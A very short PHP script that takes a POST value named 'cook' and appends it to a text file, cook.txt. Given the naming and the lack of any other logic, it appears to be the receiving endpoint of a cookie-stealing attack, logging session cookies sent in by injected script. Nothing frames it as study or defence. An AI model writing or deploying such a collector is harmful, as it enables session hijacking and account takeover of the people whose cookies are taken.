<?php
$cook=$_POST['cook'];
file_put_contents("cook.txt",$cook."\n",FILE_APPEND)
?>
